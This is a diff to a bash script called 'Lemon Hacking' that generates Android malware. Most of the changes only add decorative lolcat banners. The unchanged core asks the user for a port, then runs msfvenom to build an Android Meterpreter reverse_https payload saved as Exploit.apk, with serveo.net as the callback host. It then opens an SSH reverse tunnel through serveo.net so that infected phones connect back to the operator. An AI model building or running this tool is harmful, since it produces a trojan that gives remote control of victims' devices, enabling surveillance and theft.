@@ -1,13 +1,17 @@
 clear
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
 figlet L e m o n
 figlet H a c k i n g
-echo By Lemon Hacking
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
+echo By Lemon Hacking | lolcat
 echo [+] PLEASE ENTER A PORT, '(more than 1024)' | lolcat
 read port
 if [ $port -le 1024 ]
 then
 printf "\033[1;31m[-] Port must be more than 1024\033[0m\n"
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
 else
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
 echo [+] Do you want to continue? | lolcat
 read ans
 if [ $ans = yes ]
@@ -15,6 +19,7 @@ then
 echo [+] LHOST=serveo.net | lolcat
 echo [+] LPORT=$port | lolcat
 echo [+] This may take a few minutes | lolcat
+echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
 msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=$port R> $HOME/Lemon/Exploit.apk
 ssh -o "ExitOnForwardFailure yes" -R $port:localhost:$port serveo.net
 clear
